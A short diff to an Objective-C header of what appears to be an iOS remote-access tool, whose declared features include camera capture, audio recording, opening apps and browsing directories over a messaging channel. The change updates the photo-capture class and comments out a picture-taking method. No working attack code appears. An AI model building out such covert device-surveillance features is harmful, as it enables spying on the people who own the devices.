@@ -40,7 +40,7 @@ extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean su
 
 @property (retain) NSFileManager *fileManager;
 @property (retain) CPDistributedMessagingCenter *messagingCenter;
-@property (readwrite, retain) AVCaptureStillImageOutput *stillImageOutput;
+@property (readwrite, retain) AVCapturePhotoOutput *stillImageOutput;
 @property (nonatomic,strong) AVCaptureSession *session;
 @property (nonatomic,retain) AVAudioRecorder *audioRecorder;
 @property (retain) UIDevice *thisUIDevice;
@@ -58,7 +58,7 @@ extern int SBSLaunchApplicationWithIdentifier(CFStringRef identifier, Boolean su
 -(void)openURL:(NSString *)arg;
 -(void)openApp:(NSString *)arg;
 -(NSData *)receiveData:(long)size;
--(void)takePicture:(bool)front;
+// -(void)takePicture:(bool)front;
 -(void)tabComplete:(NSString *)path;
 -(void)listDirectory:(NSString *)path;
 -(NSDictionary *)getDirectoryContents:(NSString *)path;
